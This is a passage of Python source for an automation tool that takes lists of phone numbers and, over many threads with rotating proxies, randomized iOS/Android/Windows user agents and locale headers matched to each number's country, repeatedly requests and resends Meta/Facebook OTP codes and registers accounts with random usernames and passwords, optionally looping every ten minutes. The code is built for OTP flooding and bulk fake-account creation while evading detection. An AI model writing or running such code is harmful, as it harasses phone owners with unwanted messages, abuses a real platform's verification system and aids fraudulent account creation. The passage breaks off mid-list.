        with print_lock:
            sys.stdout.write(get_status_bar())
            sys.stdout.flush()


# Utility functions

def generate_s_val():
    """Generate a random __s parameter value."""
    return ':'.join(''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) for _ in range(3))

def generate_qpl_join_id():
    """Generate a random QPL join ID."""
    return ''.join(random.choices('0123456789abcdef', k=17))

def generate_password(length=None):
    """Generate a random password for registration."""
    if length is None:
        length = random.randint(8, 12)
    pwd_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"
    return ''.join(random.choice(pwd_chars) for _ in range(length))

def save_remaining_numbers(remaining_numbers):
    """Update Number_List.txt with remaining unprocessed numbers."""
    num_file = get_number_file_path()
    with file_lock:
        with open(num_file, "w") as f_out:
            for num in remaining_numbers:
                f_out.write(num + "\n")

def save_failed_number(number):
    """Append a failed number to Failed_Numbers.txt (Disabled by user request)."""
    pass

def save_success_number(number):
    """Append a successful number to Success_Numbers.txt (Disabled by user request)."""
    pass


def get_random_profile_ua():
    """Dynamically get a high-trust browser user agent profile from IOS_NEW_VERSIONS."""
    return get_ios_new()



# Setup menus

def setup_user_agent(setting_key="api_settings"):
    """Use random User Agents including iOS, Android, and Windows."""
    return get_random_profile_ua
def setup_proxies(setting_key="api_settings"):
    """Choose connection mode and setup proxies if selected."""
    clear_logo()
    settings = load_settings(setting_key)
    proxy_set = settings.get("proxy_settings", {})
    ask_proxy = proxy_set.get("ask_for_proxy", True)
    
    use_proxy = False
    if ask_proxy:
        print(f" {opt_labels[0]} Real IP (Direct Connection)")
        print(f" {opt_labels[1]} Proxy (Use Proxy List / Settings)")
        print(f"{LINE}")
        choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Connection Mode {EKL} ").strip()
        if choice in ['2', '02']:
            use_proxy = True
        else:
            use_proxy = False
    else:
        # If ask_for_proxy is False, automatically use proxy if it's available
        proxy_file = get_proxy_file_path()
        has_txt = os.path.exists(proxy_file) and os.path.getsize(proxy_file) > 0
        def_proxy = proxy_set.get("default_proxy", "")
        if has_txt or def_proxy:
            use_proxy = True
        else:
            use_proxy = False

    if use_proxy:
        PROXY_LIST = get_proxy_list(settings_key=setting_key)
        PROXY_ITERATOR = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
        if PROXY_LIST:
            print(f"{GREEN} [{RED}◆{GREEN}] Total Proxies {EKL} {len(PROXY_LIST)}")
        else:
            print(f"{YELLOW} No active proxies working. Proceeding with Real IP / VPN connection.")
        return PROXY_LIST, PROXY_ITERATOR
    else:
        print(f"{GREEN} [{RED}◆{GREEN}] Connection Mode {EKL} Real IP (Direct)")
        time.sleep(1)
        return [], None

def setup_browser(setting_key="selenium_settings"):
    """Interactive browser selection menu for Selenium mode."""
    clear_logo()
    settings = load_settings(setting_key)
    browser_set = settings.get("browser_settings", {})
    ask_browser = browser_set.get("ask_for_browser", True)
    def_browser = str(browser_set.get("default_browser", "chrome")).strip().lower()

    if not ask_browser:
        choice = def_browser
        print(f"{GREEN} [{RED}◆{GREEN}] Default Browser Selected {EKL} {choice}")
    else:
        print(f" {opt_labels[0]} Google Chrome (Default)")
        print(f" {opt_labels[1]} Microsoft Edge")
        print(f" {opt_labels[2]} Mozilla Firefox")
        print(f" {opt_labels[3]} Brave Browser")
        print(f" {opt_labels[4]} Opera Browser\n{LINE}")

        choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Browser {EKL} ").strip()

    if choice in ['2', '02', 'edge']:
        return 'edge'
    elif choice in ['3', '03', 'firefox']:
        return 'firefox'
    elif choice in ['4', '04', 'brave']:
        return 'brave'
    elif choice in ['5', '05', 'opera']:
        return 'opera'
    else:
        return 'chrome'

def setup_headless_mode(setting_key="selenium_settings"):
    """Interactive headless mode selection."""
    clear_logo()
    settings = load_settings(setting_key)
    headless_set = settings.get("headless_settings", {})
    ask_headless = headless_set.get("ask_for_headless", True)
    def_headless = headless_set.get("default_headless", False)

    if not ask_headless:
        print(f"{GREEN} [{RED}◆{GREEN}] Headless Mode {EKL} {def_headless} (From Config)")
        return bool(def_headless)
    else:
        print(f" {opt_labels[0]} Visible (UI Open)")
        print(f" {opt_labels[1]} Headless (Background)\n{LINE}")
        h_choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Mode {EKL} ").strip()
        return True if h_choice in ['2', '02'] else False

def setup_start_route(setting_key="selenium_settings"):
    """Choose between starting from Meta AI homepage or auth page directly."""
    clear_logo()
    settings = load_settings(setting_key)
    route_set = settings.get("route_settings", {})
    ask_route = route_set.get("ask_for_route", True)
    try:
        def_route = int(route_set.get("default_route", 0))
    except:
        def_route = 0

    if not ask_route:
        print(f"{GREEN} [{RED}◆{GREEN}] Start Route {EKL} {def_route} (From Config)")
        return def_route
    else:
        print(f" {opt_labels[0]} Start from Home (Default)")
        print(f" {opt_labels[1]} Start from Auth Page\n{LINE}")
        route_choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Starting Route {EKL} ").strip()
        return 1 if route_choice in ['2', '02'] else 0

def setup_work_mode(setting_key="selenium_settings"):
    """Choose between Both / Resend-Only / Create-Only work modes."""
    clear_logo()
    settings = load_settings(setting_key)
    work_set = settings.get("work_mode", {})
    ask_mode = work_set.get("ask_for_mode", True)
    try:
        def_mode = int(work_set.get("default_mode", 0))
    except:
        def_mode = 0

    work_mode = def_mode
    if not ask_mode:
        print(f"{GREEN} [{RED}◆{GREEN}] Work Mode {EKL} {def_mode} (From Config)")
    else:
        print(f" {opt_labels[0]} Both (Resend + Create)")
        print(f" {opt_labels[1]} Resend Only (Ignore Create New Account)")
        print(f" {opt_labels[2]} Create Only (Ignore Existing Accounts)\n{LINE}")
        wm = input(f"{GREEN} [{RED}◆{GREEN}] Select Work Mode [Enter for Default] {EKL} ").strip()
        if wm in ['0', '1', '01']:
            work_mode = 0
        elif wm in ['2', '02']:
            work_mode = 1
        elif wm in ['3', '03']:
            work_mode = 2
    return work_mode

def setup_otp_resend(setting_key="api_settings"):
    """Configure OTP resend count."""
    clear_logo()
    settings = load_settings(setting_key)
    otp_set = settings.get("otp_settings", {})
    ask_resend = otp_set.get("ask_for_resend_count", True)
    try:
        def_resend = int(otp_set.get("default_resend_count", 1))
    except:
        def_resend = 1

    if not ask_resend:
        resend_count = def_resend
        print(f"{GREEN} [{RED}◆{GREEN}] Resend OTP Count {EKL} {resend_count} (From Config)")
    else:
        print(f"{WHITE} How many times to Resend OTP? (0 to disable Resend)")
        r_inp = input(f"{GREEN} [{RED}◆{GREEN}] Resend Count [Default: {def_resend}] {EKL} ").strip()
        try:
            resend_count = int(r_inp) if r_inp else def_resend
        except:
            resend_count = def_resend
            print(f"{RED} Invalid input. Using Default {EKL} {resend_count}")
        print(f"{GREEN} [{RED}◆{GREEN}] Resend OTP Set to {EKL} {resend_count}")

    return resend_count

def setup_threads(setting_key="api_settings"):
    """Configure the number of worker threads."""
    settings = load_settings(setting_key)
    thread_set = settings.get("thread_settings", {})
    ask_threads = thread_set.get("ask_for_threads", True)
    try:
        def_threads = int(thread_set.get("default_threads", 20))
    except:
        def_threads = 20

    if not ask_threads:
        print(f"{GREEN} [{RED}◆{GREEN}] Threads {EKL} {def_threads} (From Config)")
        return def_threads

    try:
        w_inp = input(f"{LINE}\n{GREEN} [{RED}◆{GREEN}] Enter number of Threads/Workers [{def_threads}] {EKL} ").strip()
        if w_inp:
            return int(w_inp)
        else:
            return def_threads
    except:
        return def_threads

def display_final_summary(continuous_mode=False):
    """Print the final processing summary after all numbers are done."""
    with print_lock:
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()
    print(f"\n{LINE}")
    print(f"{GREEN} [{RED}◆{GREEN}] {WHITE}Completed Processing {total_checked} Numbers.")
    print(f"{GREEN} [{RED}◆{GREEN}] {GREEN}Total Success {EKL} {total_success}")
    print(f"{GREEN} [{RED}◆{GREEN}] {YELLOW}Total Failed  {EKL} {total_failed}")
    print(f"{GREEN} [{RED}◆{GREEN}] {RED}Total Error   {EKL} {total_error}")
    print(f"{LINE}")
    settings = load_settings("api_settings")
    if not continuous_mode and not settings.get("file_input_settings", {}).get("always_use_txt", False):
        input(f"{WHITE} Press Enter to exit...")

_PREFIX_TO_COUNTRY = {
    # North America
    "1":   {"lang": "en-US,en;q=0.9", "country": "US", "browser_lang": ["en-US", "en"]},
    "52":  {"lang": "es-MX,es;q=0.9,en-US;q=0.8", "country": "MX", "browser_lang": ["es-MX", "es", "en-US"]},
    
    # South America
    "55":  {"lang": "pt-BR,pt;q=0.9,en-US;q=0.8", "country": "BR", "browser_lang": ["pt-BR", "pt", "en-US"]},
    "54":  {"lang": "es-AR,es;q=0.9,en-US;q=0.8", "country": "AR", "browser_lang": ["es-AR", "es", "en-US"]},
    "57":  {"lang": "es-CO,es;q=0.9,en-US;q=0.8", "country": "CO", "browser_lang": ["es-CO", "es", "en-US"]},
    "51":  {"lang": "es-PE,es;q=0.9,en-US;q=0.8", "country": "PE", "browser_lang": ["es-PE", "es", "en-US"]},
    "56":  {"lang": "es-CL,es;q=0.9,en-US;q=0.8", "country": "CL", "browser_lang": ["es-CL", "es", "en-US"]},
    "58":  {"lang": "es-VE,es;q=0.9,en-US;q=0.8", "country": "VE", "browser_lang": ["es-VE", "es", "en-US"]},
    "593": {"lang": "es-EC,es;q=0.9,en-US;q=0.8", "country": "EC", "browser_lang": ["es-EC", "es", "en-US"]},
    "591": {"lang": "es-BO,es;q=0.9,en-US;q=0.8", "country": "BO", "browser_lang": ["es-BO", "es", "en-US"]},
    "595": {"lang": "es-PY,es;q=0.9,en-US;q=0.8", "country": "PY", "browser_lang": ["es-PY", "es", "en-US"]},
    "598": {"lang": "es-UY,es;q=0.9,en-US;q=0.8", "country": "UY", "browser_lang": ["es-UY", "es", "en-US"]},

    # Europe
    "44":  {"lang": "en-GB,en;q=0.9,en-US;q=0.8", "country": "GB", "browser_lang": ["en-GB", "en", "en-US"]},
    "33":  {"lang": "fr-FR,fr;q=0.9,en-US;q=0.8", "country": "FR", "browser_lang": ["fr-FR", "fr", "en-US"]},
    "49":  {"lang": "de-DE,de;q=0.9,en-US;q=0.8", "country": "DE", "browser_lang": ["de-DE", "de", "en-US"]},
    "39":  {"lang": "it-IT,it;q=0.9,en-US;q=0.8", "country": "IT", "browser_lang": ["it-IT", "it", "en-US"]},
    "34":  {"lang": "es-ES,es;q=0.9,en-US;q=0.8", "country": "ES", "browser_lang": ["es-ES", "es", "en-US"]},
    "31":  {"lang": "nl-NL,nl;q=0.9,en-US;q=0.8", "country": "NL", "browser_lang": ["nl-NL", "nl", "en-US"]},
    "32":  {"lang": "nl-BE,nl;q=0.9,fr;q=0.8,en-US;q=0.7", "country": "BE", "browser_lang": ["nl-BE", "nl", "fr", "en-US"]},
    "41":  {"lang": "de-CH,de;q=0.9,fr;q=0.8,it;q=0.7", "country": "CH", "browser_lang": ["de-CH", "de", "fr", "it"]},
    "43":  {"lang": "de-AT,de;q=0.9,en-US;q=0.8", "country": "AT", "browser_lang": ["de-AT", "de", "en-US"]},
    "46":  {"lang": "sv-SE,sv;q=0.9,en-US;q=0.8", "country": "SE", "browser_lang": ["sv-SE", "sv", "en-US"]},
    "47":  {"lang": "no-NO,no;q=0.9,en-US;q=0.8", "country": "NO", "browser_lang": ["no-NO", "no", "en-US"]},
    "45":  {"lang": "da-DK,da;q=0.9,en-US;q=0.8", "country": "DK", "browser_lang": ["da-DK", "da", "en-US"]},
    "358": {"lang": "fi-FI,fi;q=0.9,en-US;q=0.8", "country": "FI", "browser_lang": ["fi-FI", "fi", "en-US"]},
    "48":  {"lang": "pl-PL,pl;q=0.9,en-US;q=0.8", "country": "PL", "browser_lang": ["pl-PL", "pl", "en-US"]},
    "420": {"lang": "cs-CZ,cs;q=0.9,en-US;q=0.8", "country": "CZ", "browser_lang": ["cs-CZ", "cs", "en-US"]},
    "351": {"lang": "pt-PT,pt;q=0.9,en-US;q=0.8", "country": "PT", "browser_lang": ["pt-PT", "pt", "en-US"]},
    "30":  {"lang": "el-GR,el;q=0.9,en-US;q=0.8", "country": "GR", "browser_lang": ["el-GR", "el", "en-US"]},
    "36":  {"lang": "hu-HU,hu;q=0.9,en-US;q=0.8", "country": "HU", "browser_lang": ["hu-HU", "hu", "en-US"]},
    "7":   {"lang": "ru-RU,ru;q=0.9,en-US;q=0.8", "country": "RU", "browser_lang": ["ru-RU", "ru", "en-US"]},
    "380": {"lang": "uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "UA", "browser_lang": ["uk-UA", "uk", "ru", "en-US"]},
    "375": {"lang": "be-BY,be;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "BY", "browser_lang": ["be-BY", "be", "ru", "en-US"]},

    # Asia & Middle East
    "86":  {"lang": "zh-CN,zh;q=0.9,en-US;q=0.8", "country": "CN", "browser_lang": ["zh-CN", "zh", "en-US"]},
    "91":  {"lang": "hi-IN,hi;q=0.9,en-US;q=0.8", "country": "IN", "browser_lang": ["hi-IN", "hi", "en-US"]},
    "81":  {"lang": "ja-JP,ja;q=0.9,en-US;q=0.8", "country": "JP", "browser_lang": ["ja-JP", "ja", "en-US"]},
    "82":  {"lang": "ko-KR,ko;q=0.9,en-US;q=0.8", "country": "KR", "browser_lang": ["ko-KR", "ko", "en-US"]},
    "62":  {"lang": "id-ID,id;q=0.9,en-US;q=0.8", "country": "ID", "browser_lang": ["id-ID", "id", "en-US"]},
    "92":  {"lang": "ur-PK,ur;q=0.9,en-US;q=0.8", "country": "PK", "browser_lang": ["ur-PK", "ur", "en-US"]},
    "880": {"lang": "bn-BD,bn;q=0.9,en-US;q=0.8", "country": "BD", "browser_lang": ["bn-BD", "bn", "en-US"]},
    "84":  {"lang": "vi-VN,vi;q=0.9,en-US;q=0.8", "country": "VN", "browser_lang": ["vi-VN", "vi", "en-US"]},
    "66":  {"lang": "th-TH,th;q=0.9,en-US;q=0.8", "country": "TH", "browser_lang": ["th-TH", "th", "en-US"]},
    "63":  {"lang": "fil-PH,fil;q=0.9,en-US;q=0.8", "country": "PH", "browser_lang": ["fil-PH", "fil", "en-US"]},
    "60":  {"lang": "ms-MY,ms;q=0.9,en-US;q=0.8", "country": "MY", "browser_lang": ["ms-MY", "ms", "en-US"]},
    "95":  {"lang": "my-MM,my;q=0.9,en-US;q=0.8", "country": "MM", "browser_lang": ["my-MM", "my", "en-US"]},
    "94":  {"lang": "si-LK,si;q=0.9,en-US;q=0.8", "country": "LK", "browser_lang": ["si-LK", "si", "en-US"]},
    "977": {"lang": "ne-NP,ne;q=0.9,en-US;q=0.8", "country": "NP", "browser_lang": ["ne-NP", "ne", "en-US"]},
    "98":  {"lang": "fa-IR,fa;q=0.9,en-US;q=0.8", "country": "IR", "browser_lang": ["fa-IR", "fa", "en-US"]},
    "966": {"lang": "ar-SA,ar;q=0.9,en-US;q=0.8", "country": "SA", "browser_lang": ["ar-SA", "ar", "en-US"]},
    "971": {"lang": "ar-AE,ar;q=0.9,en-US;q=0.8", "country": "AE", "browser_lang": ["ar-AE", "ar", "en-US"]},
    "972": {"lang": "he-IL,he;q=0.9,en-US;q=0.8", "country": "IL", "browser_lang": ["he-IL", "he", "en-US"]},
    "90":  {"lang": "tr-TR,tr;q=0.9,en-US;q=0.8", "country": "TR", "browser_lang": ["tr-TR", "tr", "en-US"]},
    "998": {"lang": "uz-UZ,uz;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "UZ", "browser_lang": ["uz-UZ", "uz", "ru", "en-US"]},
    "93":  {"lang": "fa-AF,fa;q=0.9,ps;q=0.8,en-US;q=0.7", "country": "AF", "browser_lang": ["fa-AF", "fa", "ps", "en-US"]},
    "964": {"lang": "ar-IQ,ar;q=0.9,en-US;q=0.8", "country": "IQ", "browser_lang": ["ar-IQ", "ar", "en-US"]},
    "962": {"lang": "ar-JO,ar;q=0.9,en-US;q=0.8", "country": "JO", "browser_lang": ["ar-JO", "ar", "en-US"]},
    "961": {"lang": "ar-LB,ar;q=0.9,en-US;q=0.8", "country": "LB", "browser_lang": ["ar-LB", "ar", "en-US"]},
    "965": {"lang": "ar-KW,ar;q=0.9,en-US;q=0.8", "country": "KW", "browser_lang": ["ar-KW", "ar", "en-US"]},
    "974": {"lang": "ar-QA,ar;q=0.9,en-US;q=0.8", "country": "QA", "browser_lang": ["ar-QA", "ar", "en-US"]},
    "973": {"lang": "ar-BH,ar;q=0.9,en-US;q=0.8", "country": "BH", "browser_lang": ["ar-BH", "ar", "en-US"]},
    "968": {"lang": "ar-OM,ar;q=0.9,en-US;q=0.8", "country": "OM", "browser_lang": ["ar-OM", "ar", "en-US"]},
    "963": {"lang": "ar-SY,ar;q=0.9,en-US;q=0.8", "country": "SY", "browser_lang": ["ar-SY", "ar", "en-US"]},
    "967": {"lang": "ar-YE,ar;q=0.9,en-US;q=0.8", "country": "YE", "browser_lang": ["ar-YE", "ar", "en-US"]},

    # Africa
    "20":  {"lang": "ar-EG,ar;q=0.9,en-US;q=0.8", "country": "EG", "browser_lang": ["ar-EG", "ar", "en-US"]},
    "212": {"lang": "ar-MA,ar;q=0.9,fr;q=0.8",   "country": "MA", "browser_lang": ["ar-MA", "ar", "fr"]},
    "213": {"lang": "ar-DZ,ar;q=0.9,fr;q=0.8",   "country": "DZ", "browser_lang": ["ar-DZ", "ar", "fr"]},
    "216": {"lang": "ar-TN,ar;q=0.9,fr;q=0.8",   "country": "TN", "browser_lang": ["ar-TN", "ar", "fr"]},
    "234": {"lang": "en-NG,en;q=0.9",             "country": "NG", "browser_lang": ["en-NG", "en"]},
    "27":  {"lang": "en-ZA,en;q=0.9,af;q=0.8",   "country": "ZA", "browser_lang": ["en-ZA", "en", "af"]},
    "254": {"lang": "sw-KE,sw;q=0.9,en-US;q=0.8", "country": "KE", "browser_lang": ["sw-KE", "sw", "en-US"]},
    "255": {"lang": "sw-TZ,sw;q=0.9,en-US;q=0.8", "country": "TZ", "browser_lang": ["sw-TZ", "sw", "en-US"]},
    "256": {"lang": "en-UG,en;q=0.9,sw;q=0.8",   "country": "UG", "browser_lang": ["en-UG", "en", "sw"]},
    "233": {"lang": "en-GH,en;q=0.9",             "country": "GH", "browser_lang": ["en-GH", "en"]},
    "251": {"lang": "am-ET,am;q=0.9,en-US;q=0.8", "country": "ET", "browser_lang": ["am-ET", "am", "en-US"]},
    "218": {"lang": "ar-LY,ar;q=0.9,en-US;q=0.8", "country": "LY", "browser_lang": ["ar-LY", "ar", "en-US"]},
    "249": {"lang": "ar-SD,ar;q=0.9,en-US;q=0.8", "country": "SD", "browser_lang": ["ar-SD", "ar", "en-US"]},
    "221": {"lang": "fr-SN,fr;q=0.9,en-US;q=0.8", "country": "SN", "browser_lang": ["fr-SN", "fr", "en-US"]},
    "225": {"lang": "fr-CI,fr;q=0.9,en-US;q=0.8", "country": "CI", "browser_lang": ["fr-CI", "fr", "en-US"]},
    "237": {"lang": "fr-CM,fr;q=0.9,en-US;q=0.8", "country": "CM", "browser_lang": ["fr-CM", "fr", "en-US"]},
    "244": {"lang": "pt-AO,pt;q=0.9,en-US;q=0.8", "country": "AO", "browser_lang": ["pt-AO", "pt", "en-US"]},
    "258": {"lang": "pt-MZ,pt;q=0.9,en-US;q=0.8", "country": "MZ", "browser_lang": ["pt-MZ", "pt", "en-US"]},
    "260": {"lang": "en-ZM,en;q=0.9",             "country": "ZM", "browser_lang": ["en-ZM", "en"]},
    "263": {"lang": "en-ZW,en;q=0.9",             "country": "ZW", "browser_lang": ["en-ZW", "en"]},
    "250": {"lang": "rw-RW,rw;q=0.9,fr;q=0.8",   "country": "RW", "browser_lang": ["rw-RW", "rw", "fr", "en-US"]},
    "261": {"lang": "mg-MG,mg;q=0.9,fr;q=0.8",   "country": "MG", "browser_lang": ["mg-MG", "mg", "fr", "en-US"]},
    "252": {"lang": "so-SO,so;q=0.9,ar;q=0.8",   "country": "SO", "browser_lang": ["so-SO", "so", "ar", "en-US"]},
    
    # Oceania
    "61":  {"lang": "en-AU,en;q=0.9,en-US;q=0.8", "country": "AU", "browser_lang": ["en-AU", "en", "en-US"]},
    "64":  {"lang": "en-NZ,en;q=0.9,en-US;q=0.8", "country": "NZ", "browser_lang": ["en-NZ", "en", "en-US"]},
    "679": {"lang": "en-FJ,en;q=0.9",             "country": "FJ", "browser_lang": ["en-FJ", "en"]},
    "675": {"lang": "en-PG,en;q=0.9",             "country": "PG", "browser_lang": ["en-PG", "en"]},
}

SELECTED_LANGUAGE_HEADER = None

def setup_language(setting_key="api_settings"):
    """Interactive language selection menu for OTP requests."""
    global SELECTED_LANGUAGE_HEADER
    clear_logo()

    lang_options = [
        ("Auto Match (Proxy/Number Country)", "auto"),
        ("Arabic - Egypt (ar-EG)", "ar-EG,ar;q=0.9,en-US;q=0.8", "EG"),
        ("Arabic - Saudi Arabia (ar-SA)", "ar-SA,ar;q=0.9,en-US;q=0.8", "SA"),
        ("Arabic - UAE (ar-AE)", "ar-AE,ar;q=0.9,en-US;q=0.8", "AE"),
        ("Arabic - Algeria (ar-DZ)", "ar-DZ,ar;q=0.9,fr;q=0.8", "DZ"),
        ("Arabic - Morocco (ar-MA)", "ar-MA,ar;q=0.9,fr;q=0.8", "MA"),
        ("Bengali - Bangladesh (bn-BD)", "bn-BD,bn;q=0.9,en-US;q=0.8", "BD"),
        ("English - US (en-US)", "en-US,en;q=0.9", "US"),
        ("English - UK (en-GB)", "en-GB,en;q=0.9", "GB"),
        ("French - France (fr-FR)", "fr-FR,fr;q=0.9,en-US;q=0.8", "FR"),
        ("Russian - Russia (ru-RU)", "ru-RU,ru;q=0.9,en-US;q=0.8", "RU"),
        ("Portuguese - Brazil (pt-BR)", "pt-BR,pt;q=0.9,en-US;q=0.8", "BR"),
        ("Spanish - Mexico (es-MX)", "es-MX,es;q=0.9,en-US;q=0.8", "MX"),
        ("Turkish - Turkey (tr-TR)", "tr-TR,tr;q=0.9,en-US;q=0.8", "TR"),
        ("Hindi - India (hi-IN)", "hi-IN,hi;q=0.9,en-US;q=0.8", "IN"),
        ("Random / Rotate Languages", "random")
    ]

    settings = load_settings(setting_key)
    lang_set = settings.get("language_settings", {})
    ask_lang = lang_set.get("ask_for_language", True)
    def_lang = str(lang_set.get("default_language", "auto")).strip().lower()

    if not ask_lang:
        if def_lang == "auto":
            SELECTED_LANGUAGE_HEADER = None
            print(f"{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} Auto Match (Proxy/Number Country)")
        else:
            SELECTED_LANGUAGE_HEADER = def_lang
            print(f"{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} {def_lang}")
        return

    print(f"{WHITE} Select Language for OTP requests:")
    for idx, (label, val, *rest) in enumerate(lang_options):
        print(f" [{GREEN}{idx+1:02d}{WHITE}] {label}")
    print(f"{LINE}")

    choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Language [Default: 01 Auto] {EKL} ").strip()
    if not choice or choice in ['1', '01']:
        SELECTED_LANGUAGE_HEADER = None
        print(f"{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} Auto Match")
    else:
        try:
            c_idx = int(choice) - 1
            if 0 <= c_idx < len(lang_options):
                opt = lang_options[c_idx]
                if opt[1] == "auto":
                    SELECTED_LANGUAGE_HEADER = None
                elif opt[1] == "random":
                    SELECTED_LANGUAGE_HEADER = "random"
                else:
                    SELECTED_LANGUAGE_HEADER = (opt[1], opt[2])
                print(f"{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} {opt[0]}")
            else:
                SELECTED_LANGUAGE_HEADER = None
                print(f"{YELLOW} Invalid selection. Defaulting to Auto Match.")
        except Exception:
            SELECTED_LANGUAGE_HEADER = None

def get_locale_for_proxy(proxy_data=None, phone_number=None):
    global SELECTED_LANGUAGE_HEADER

    # Handle manual language selection
    if SELECTED_LANGUAGE_HEADER:
        if SELECTED_LANGUAGE_HEADER == "random":
            item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
            return item["lang"], item["country"], item["browser_lang"]
        elif isinstance(SELECTED_LANGUAGE_HEADER, tuple):
            lang_str, c_code = SELECTED_LANGUAGE_HEADER
            return lang_str, c_code, [lang_str.split(',')[0]]

    # 1. Target phone number prefix match (e.g. UZ for +998, DZ for +213, ET for +251)
    if phone_number:
        clean_num = phone_number.replace('+', '').replace('-', '').replace(' ', '')
        for prefix, data in sorted(_PREFIX_TO_COUNTRY.items(), key=lambda x: len(x[0]), reverse=True):
            if clean_num.startswith(prefix):
                return data["lang"], data["country"], data["browser_lang"]

    # 2. Try to determine country from proxy IP or proxy object metadata (matching request headers with proxy IP origin)
    proxy_country = None
    if proxy_data:
        if isinstance(proxy_data, dict) and 'country' in proxy_data and proxy_data['country'] != 'Unknown':
            proxy_country = proxy_data['country']

    if proxy_country:
        for prefix, data in _PREFIX_TO_COUNTRY.items():
            if data["country"] == proxy_country:
                return data["lang"], data["country"], data["browser_lang"]

    # Ultimate fallback: Random selection if nothing else works
    item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
    return item["lang"], item["country"], item["browser_lang"]


import urllib.parse
import re

def safe_get(session, url, headers=None, timeout=15):
    """Safely execute GET requests handling fbredirect:// and custom mobile scheme redirects."""
    curr_url = url
    resp = None
    for _ in range(10):
        try:
            resp = session.get(curr_url, headers=headers, allow_redirects=False, timeout=timeout)
        except Exception as e:
            err_str = str(e)
            if "fbredirect://" in err_str:
                match = re.search(r"uri=([^\'&]+)", err_str)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
            raise e

        if resp.status_code in [301, 302, 303, 307, 308]:
            loc = resp.headers.get("Location") or resp.headers.get("location") or ""
            if loc.startswith("fbredirect://"):
                match = re.search(r"uri=([^&]+)", loc)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
                else:
                    curr_url = loc.replace("fbredirect://", "https://")
                    continue
            elif loc.startswith("/"):
                curr_url = f"https://m.facebook.com{loc}"
                continue
            elif loc.startswith("http"):
                curr_url = loc
                continue
        return resp
    return resp




# ========================================
# api_bot.py
# ========================================
import os
import sys
import time
import random
import string
import uuid
from curl_cffi import requests
import json
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs


if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')
    os.system('')


def run():
    """Entry point for API automation mode."""
    clear_logo()
    numbers = file_input("api_settings")
    if not numbers:
        input(f"{WHITE} Press Enter to exit...")
        return

    ua_func = setup_user_agent("api_settings")
    if not ua_func: return

    PROXY_LIST, PROXY_ITERATOR = setup_proxies("api_settings")
    setup_language("api_settings")
    resend_count = setup_otp_resend("api_settings")
    max_workers = setup_threads("api_settings")

    clear_logo()
    print(f" {opt_labels[0]} Run Once (Default)")
    print(f" {opt_labels[1]} Continuous Loop (10 Min Delay between runs)")
    print(f"{LINE}")
    loop_choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Execution Mode {EKL} ").strip()
    continuous_mode = True if loop_choice in ['2', '02'] else False

    original_numbers = list(numbers)
    import concurrent.futures

    while True:
        clear_logo()
        reset_counters()
        set_total_numbers(len(original_numbers))
        print(f"{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}")
        print(f"{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}")
        print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
        print(f"{GREEN} [{RED}◆{GREEN}] Mode            {EKL} {'Continuous Loop' if continuous_mode else 'Run Once'}")
        print(f"{LINE}")

        executor = ThreadPoolExecutor(max_workers=max_workers)
        remaining_numbers = list(original_numbers)
        
        retry_counts = {}
        future_to_num = {}

        for num in original_numbers:
            proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
            user_agent = ua_func()
            future = executor.submit(process_number, num, user_agent, proxy_data, resend_count)
            future_to_num[future] = num

        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None

                with file_lock:
                    if res == "RETRY":
                        attempts = retry_counts.get(n, 0)
                        if attempts < 2:
                            retry_counts[n] = attempts + 1
                            proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                            user_agent = ua_func()
                            new_f = executor.submit(process_number, n, user_agent, proxy_data, resend_count)
                            future_to_num[new_f] = n
                            continue  # Do not remove from remaining_numbers
                    
                    if not continuous_mode and n in remaining_numbers:
                        remaining_numbers.remove(n)
                if not continuous_mode:
                    save_remaining_numbers(remaining_numbers)

        executor.shutdown(wait=True)
        display_final_summary(continuous_mode=continuous_mode)
        
        if not continuous_mode:
            break
            
        print(f"\n{YELLOW} Waiting 10 minutes before the next run... (Press Ctrl+C to stop){RESET}")
        time.sleep(600)


def generate_random_username():
    """Generate a random username for Meta registration."""
    p1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    p1 += ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    p2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 2)))
    p2 += ''.join(random.choices(string.digits, k=random.randint(1, 2)))
    p2 += ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    p3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 6)))
    p1 = ''.join(random.sample(p1, len(p1)))
    p2 = ''.join(random.sample(p2, len(p2)))
    p3 = ''.join(random.sample(p3, len(p3)))
    return f"{p1}_{p2}_{p3}"

def generate_random_first_name():
    first_names = [
        "John", "Emma", "Liam", "Olivia", "Noah", "Ava", "William", "Sophia", "James", "Isabella",
